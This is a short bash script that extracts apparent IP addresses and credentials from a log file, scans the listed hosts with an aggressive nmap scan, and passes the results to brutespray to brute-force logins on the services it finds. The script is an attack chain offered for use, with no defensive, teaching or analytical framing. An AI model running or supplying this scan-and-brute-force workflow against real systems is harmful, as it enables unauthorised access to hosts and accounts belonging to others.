#!/bin/bash
awk '{print $4}' bap.log > cred.txt
awk '{print $1}' bap.log > ip.txt
nmap -sT -A -iL ip.txt -oG host.gnmap
brutespray --file host.gnmap -U user.txt -P pass.txt --threads 5 --hosts 5
